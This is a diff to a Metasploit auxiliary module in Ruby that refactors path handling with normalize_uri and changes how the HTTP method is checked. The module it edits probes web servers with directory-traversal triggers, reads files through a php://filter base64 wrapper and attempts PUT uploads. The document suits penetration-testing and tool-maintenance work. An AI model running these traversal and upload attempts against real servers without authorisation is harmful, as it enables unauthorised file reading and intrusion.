@@ -106,7 +106,7 @@ class Metasploit3 < Msf::Auxiliary
       1.upto(depth) do |d|
         file_to_read.each do |f|
           trigger = base * d
-          p = datastore['PATH'] + trigger + f
+          p = normalize_uri(datastore['PATH']) + trigger + f
           req = ini_request(p)
           vprint_status("Trying: http://#{rhost}:#{rport}#{p}")
           res = send_request_cgi(req, 25)
@@ -187,7 +187,7 @@ class Metasploit3 < Msf::Auxiliary
     if datastore['TRIGGER'].empty?
       # Found trigger using fuzz()
       found = true if trigger
-      uri = datastore['PATH'] + trigger
+      uri = normalize_uri(datastore['PATH']) + trigger
     else
       # Manual check. meh.
       if datastore['FILE'].empty?
@@ -195,7 +195,7 @@ class Metasploit3 < Msf::Auxiliary
         return
       end
 
-      uri = datastore['PATH'] + trigger + datastore['FILE']
+      uri = normalize_uri(datastore['PATH']) + trigger + datastore['FILE']
       req = ini_request(uri)
       vprint_status("Trying: http://#{rhost}:#{rport}#{uri}")
       res = send_request_cgi(req, 25)
@@ -211,7 +211,7 @@ class Metasploit3 < Msf::Auxiliary
         :port     => rport,
         :vhost    => datastore['VHOST'],
         :path     => uri,
-        :params   => datastore['PATH'],
+        :params   => normalize_uri(datastore['PATH']),
         :pname    => trigger,
         :risk     => 3,
         :proof    => trigger,
@@ -234,7 +234,7 @@ class Metasploit3 < Msf::Auxiliary
       # Our trigger already puts us in '/', so our filename doesn't need to begin with that
       f = f[1,f.length] if f =~ /^\//
 
-      req = ini_request(uri = (datastore['PATH'] + trigger + f).chop)
+      req = ini_request(uri = (normalize_uri(datastore['PATH']) + trigger + f).chop)
       res = send_request_cgi(req, 25)
 
       vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
@@ -261,7 +261,7 @@ class Metasploit3 < Msf::Auxiliary
       # Our trigger already puts us in '/', so our filename doesn't need to begin with that
       f = f[1,f.length] if f =~ /^\//
 
-      req = ini_request(uri = (datastore['PATH'] + "php://filter/read=convert.base64-encode/resource=" + f).chop)
+      req = ini_request(uri = (normalize_uri(datastore['PATH']) + "php://filter/read=convert.base64-encode/resource=" + f).chop)
       res = send_request_cgi(req, 25)
 
       vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
@@ -294,7 +294,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # Form the PUT request
     fname = Rex::Text.rand_text_alpha(rand(5) + 5) + '.txt'
-    uri = datastore['PATH'] + trigger + fname
+    uri = normalize_uri(datastore['PATH']) + trigger + fname
     vprint_status("Attempt to upload to: http://#{rhost}:#{rport}#{uri}")
     req = ini_request(uri)
 
@@ -331,14 +331,10 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    # Make sure datastore['PATH] begins with a '/'
-    if datastore['PATH'] !~ /^\//
-      datastore['PATH'] = '/' + datastore['PATH']
+    # Warn if it's not a well-formed UPPERCASE method
+    if datastore['METHOD'] !~ /^[A-Z]+$/
+      print_warning("HTTP method #{datastore['METHOD']} is not Apache-compliant. Try only UPPERCASE letters.")
     end
-
-    # Some webservers (ie. Apache) might not like the HTTP method to be lower-case
-    datastore['METHOD'] = datastore['METHOD'].upcase
-
     print_status("Running action: #{action.name}...")
 
     # And it's..... "SHOW TIME!!"
